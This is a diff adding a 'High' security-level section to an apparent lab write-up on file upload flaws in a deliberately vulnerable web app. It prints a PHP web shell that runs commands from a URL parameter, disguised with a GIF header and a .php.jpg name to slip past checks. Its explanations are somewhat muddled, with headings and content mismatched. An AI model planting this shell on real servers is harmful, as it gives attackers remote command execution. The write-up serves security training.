@@ -230,4 +230,28 @@ At Low security, no validation was performed on uploaded files. Any file type wa
 At Medium security, the application implements basic file validation such as checking file extensions. However, it only checks the first extension or uses a weak blacklist approach. By using a double extension like .php.jpg, the application may only check the last extension (.jpg) and incorrectly assume the file is a safe image, while the server still executes it as a PHP file due to the .php extension being recognized first. This bypass demonstrates that extension-based validation alone is insufficient without proper file content inspection and server configuration to prevent script execution in upload directories.
 
 
+### Security Level: High
+
+**Payload Used:**
+```php
+GIF89a
+<?php
+system($_GET['cmd']);
+?>
+```
+Saved as shell.php.jpg
+
+**Result:** Success - The file was uploaded successfully by combining an image header with a double extension to bypass file validation.
+
+**Screenshot:**
+![File Upload - High Security](screenshots/file-upload-high.png)
+
+**Explanation of why it worked:**
+At Low security, no validation was performed on uploaded files. At Medium security, basic extension checking was implemented but could be bypassed using double extensions.
+
+**Explanation of why it failed at higher level:**
+At High security, the application checks file content, not just extensions. However, adding a valid GIF header at the beginning tricks the content validation into identifying the file as a legitimate image. The file passes inspection while the PHP code remains executable when accessed.
+
+
+
 
